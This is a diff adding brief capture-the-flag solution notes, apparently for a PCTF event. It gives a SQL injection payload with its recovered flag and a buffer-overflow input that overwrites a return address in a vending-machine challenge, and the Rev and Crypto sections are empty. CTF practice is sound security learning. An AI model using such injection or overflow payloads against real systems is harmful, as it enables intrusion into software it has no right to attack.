@@ -1,0 +1,13 @@
+Bottom Right (Web)
+
+''union select 1,*from flag--
+`PCTF{BAD_READ.TOO_LONG.TRY_AGAIN}`
+
+Bottom-Middle (Pwn)
+```
+setVendingMachineInput('AAAAAAAAAAAAAAAAAAAAAAA\xbd\x14\x40\x00')
+```
+
+Bottom-Left	  (Rev)
+
+Top-Middle    (Crypto)
